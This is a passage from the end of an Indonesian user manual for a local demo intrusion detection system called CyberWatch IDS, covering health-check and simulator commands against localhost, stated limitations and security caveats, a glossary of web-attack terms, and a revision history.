```bash
# Server merespons?
curl http://localhost:8421/api/stats

# Jumlah aturan aktif (harus 27)
curl http://localhost:8421/api/rules

# Jumlah entri CVE (harus 30)
curl http://localhost:8421/api/cve
```

### 14.2 Log Server

Server menuliskan informasi penting ke terminal:

| Pesan | Arti |
|---|---|
| `[IDS] Loaded N active detection rules` | Jumlah aturan berhasil dimuat |
| `[IDS] Invalid regex for rule ...` | Pola regex gagal dikompilasi — perlu diperbaiki |
| `[WS] Client connected` | Dashboard terhubung |
| `[Simulator] Started` | Simulator berjalan |
| `[IDS] Event data purged` | Reset data berhasil |

---

## 15. Batasan dan Catatan Keamanan

> **Baca bagian ini sebelum menggunakan sistem di lingkungan nyata.**

### 15.1 Batasan Teknis

| Aspek | Batasan |
|---|---|
| Metode deteksi | Berbasis **tanda tangan (signature/regex)** — tidak dapat mendeteksi serangan baru (*zero-day*) yang belum memiliki pola |
| Cakupan | Hanya memeriksa permukaan input yang telah ditentukan; tidak menganalisis body biner atau *multipart upload* |
| Enkripsi | Tidak dapat memeriksa lalu lintas TLS tanpa terminasi TLS di depannya |
| Deteksi anomali | Tidak tersedia; tidak ada pembelajaran *baseline* |
| Korelasi | Korelasi CVE bersifat statis (pemetaan aturan → CVE), bukan analisis versi aktual. Kerentanan *runtime* (mis. Node.js, OpenSSL) **tidak dapat dideteksi** — lihat [bagian 11.4](#114-cve-runtime-nodejs--mengapa-tidak-ada-aturan-ids-nya) |
| Skala | Satu proses tunggal; belum diuji untuk beban produksi tinggi |
| Basis data | SQLite lokal, bukan basis data terdistribusi |

### 15.2 Catatan Keamanan Penting

1. **Tidak ada autentikasi.** Dashboard dan seluruh endpoint API dapat diakses tanpa kredensial. **Jangan** mengekspos port ini ke internet publik.
2. **Gunakan hanya di lingkungan tepercaya.** Untuk penggunaan bersama, letakkan di belakang *reverse proxy* dengan autentikasi dan TLS.
3. **Simulator tidak berbahaya secara jaringan** — ia tidak mengirim paket keluar, namun tetap membangkitkan data event.
4. **Pemblokiran IP bersifat pencatatan.** Penerapan blokir nyata harus dilakukan pada *firewall*, WAF, atau *reverse proxy*.
5. **Bukan pengganti WAF produksi.** Sistem ini dirancang untuk pemantauan, pembelajaran, dan demonstrasi.
6. **Validasi sebelum produksi.** Lakukan pengujian dan *tuning* aturan terhadap pola lalu lintas aplikasi Anda untuk menekan *false positive*.

### 15.3 Rekomendasi Penggunaan yang Tepat

| Cocok untuk | Kurang cocok untuk |
|---|---|
| Laboratorium & pembelajaran keamanan | Perlindungan produksi tanpa penyesuaian |
| Demonstrasi konsep IDS | Lingkungan dengan lalu lintas > 1000 rps |
| Pemantauan internal skala kecil | Kepatuhan regulasi formal |
| Rujukan cepat kerentanan web | Penggantian SIEM |
| Latihan *blue team* | Deteksi serangan tanpa tanda tangan |

---

## 16. Glosarium

| Istilah | Kepanjangan / Arti |
|---|---|
| **CVE** | *Common Vulnerabilities and Exposures* — pengenal unik untuk kerentanan yang dipublikasikan |
| **CVSS** | *Common Vulnerability Scoring System* — kerangka penilaian keparahan (0.0–10.0) |
| **CWE** | *Common Weakness Enumeration* — klasifikasi jenis kelemahan perangkat lunak |
| **IDS** | *Intrusion Detection System* — sistem deteksi intrusi |
| **IPS** | *Intrusion Prevention System* — sistem pencegahan intrusi (memblokir aktif) |
| **WAF** | *Web Application Firewall* — firewall khusus aplikasi web |
| **SQLi** | *SQL Injection* — injeksi perintah SQL |
| **XSS** | *Cross-Site Scripting* — penyuntikan skrip ke halaman |
| **SSRF** | *Server-Side Request Forgery* — pemalsuan permintaan sisi server |
| **XXE** | *XML External Entity* — injeksi entitas eksternal XML |
| **LFI / RFI** | *Local / Remote File Inclusion* — penyertaan berkas lokal/jarak jauh |
| **RCE** | *Remote Code Execution* — eksekusi kode jarak jauh |
| **JNDI** | *Java Naming and Directory Interface* — antarmuka direktori Java (vektor Log4Shell) |
| **OGNL** | *Object-Graph Navigation Language* — bahasa ekspresi (vektor Struts) |
| **False positive** | Deteksi keliru terhadap aktivitas yang sebenarnya sah |
| **False negative** | Serangan nyata yang tidak terdeteksi |
| **NVD** | *National Vulnerability Database* — basis data kerentanan resmi NIST |
| **Tuning** | Penyesuaian aturan untuk meningkatkan akurasi deteksi |

---

## Lampiran A — Perintah Ringkas

```bash
# Instalasi
npm install

# Inisialisasi basis data (20 CVE + 27 aturan)
npm run seed

# Jalankan server
npm start

# Jalankan pada port lain
PORT=9000 npm start

# Mulai simulator (serangan tiap 3 detik)
curl -X POST http://localhost:8421/api/simulate/start \
  -H "Content-Type: application/json" -d "{\"interval\":3000}"

# Hentikan simulator
curl -X POST http://localhost:8421/api/simulate/stop

# Picu satu serangan Log4j
curl -X POST http://localhost:8421/api/simulate/attack \
  -H "Content-Type: application/json" -d "{\"attack_type\":\"Log4j Injection\"}"

# Lihat statistik
curl http://localhost:8421/api/stats

# Cari CVE Log4j
curl "http://localhost:8421/api/cve?q=Log4j"

# Kosongkan data event (CVE & aturan tetap)
curl -X POST http://localhost:8421/api/reset
```

---

## Lampiran B — Daftar Berkas Kunci

| Berkas | Ubah bila ingin... |
|---|---|
| `server/seed-cve.js` | Menambah CVE atau aturan deteksi |
| `server/ids-engine.js` | Mengubah logika deteksi, skoring IP, atau statistik |
| `server/index.js` | Menambah endpoint API atau mengubah middleware |
| `server/simulator.js` | Menambah templat serangan simulasi |
| `client/index.html` | Mengubah struktur dashboard |
| `client/styles.css` | Mengubah tampilan (tema, warna, tata letak) |
| `client/app.js` | Mengubah perilaku antarmuka dan pemanggilan API |

---

*Dokumen ini disusun untuk CyberWatch IDS v1.0 (dokumen v1.3). Perbarui bagian referensi (jumlah aturan, daftar CVE, endpoint) setiap kali sistem mengalami perubahan.*

**Riwayat revisi**

| Versi | Perubahan |
|---|---|
| 1.0 | Versi awal: instalasi, antarmuka, referensi API, aturan, CVE, SOP |
| 1.1 | Menambahkan Bab 2 **Cara Kerja Sistem** (alur pemrosesan, pencocokan aturan, pencatatan, reputasi IP, penyimpanan, contoh penelusuran lengkap) |
| 1.2 | Menambahkan Bab 3 **Topologi & Penempatan Deployment** (posisi di DMZ, arah ingress/egress, cakupan luar vs internal, dua mode deployment, skenario instansi, prasyarat go-live, contoh konfigurasi reverse proxy) |
| 1.3 | Menambahkan **10 CVE Node.js** dari *security release* 21 Oktober 2026 (total 20 → 30 entri). Bab 11 dipecah menjadi **11.1 kerentanan web** dan **11.2 kerentanan runtime/infrastruktur**, ditambah bagian **11.4** yang menjelaskan mengapa CVE runtime tidak memiliki aturan IDS. Memperbaiki pencarian CVE multi-field (`q=`) dan filter gabungan `/api/events/search` yang sebelumnya hanya menerapkan parameter pertama |
